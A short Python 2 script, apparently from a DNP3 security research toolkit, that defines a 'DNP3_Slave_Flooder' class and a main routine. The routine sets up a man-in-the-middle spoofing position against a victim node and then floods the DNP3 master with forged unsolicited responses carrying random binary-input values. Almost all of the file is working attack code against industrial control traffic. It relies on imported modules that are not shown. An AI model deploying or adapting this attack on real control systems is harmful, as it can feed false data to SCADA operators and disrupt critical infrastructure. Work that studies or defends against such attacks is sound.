__author__ = 'Nicholas Rodofile'
from DNP3_Slave import *


class DNP3_Slave_Flooder(Slave):
    def __init__(self, node, port, timeout_time=(60 * 2)):
        Slave.__init__(self, node, port, timeout_time=timeout_time)

    def automation(self):
        print "Automation running..."
        self.configuration()
        sleep(7)
        if self.running:
            while self.running:
                int_ = randint(0, 255)
                self.node.spoofer.object_handler.update_binary_input_point(2, 1, int_)
                unsolicited_response = self.node.spoofer.get_unsolicited_response(2, 2)
                self.queue_out.put(unsolicited_response)


if __name__ == '__main__':

    while True:
        mitm = DNP3_MITM_conf()
        mitm.init_spoofing()
        victim = mitm.victim
        subprocess.call("./networkrestart.sh")
        slave = DNP3_Slave_Flooder(victim, dnp3_port)
        DNP = slave.start()
        subprocess.call("./networkrestart_attacker.sh")
        quit()